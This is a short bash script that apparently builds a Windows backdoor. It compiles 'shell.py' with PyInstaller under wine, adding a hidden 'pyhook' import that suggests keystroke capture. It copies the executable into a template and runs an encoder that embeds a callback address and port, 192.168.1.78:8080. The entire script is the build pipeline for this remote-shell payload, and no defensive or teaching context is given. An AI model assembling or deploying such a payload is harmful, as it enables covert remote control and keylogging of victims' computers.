#!/bin/bash

wine pyinstaller --onefile --hidden-import=pyhook shell.py
mv dist/shell.exe template/template.exe
./encode.py 192.168.1.78 8080 shell.exe
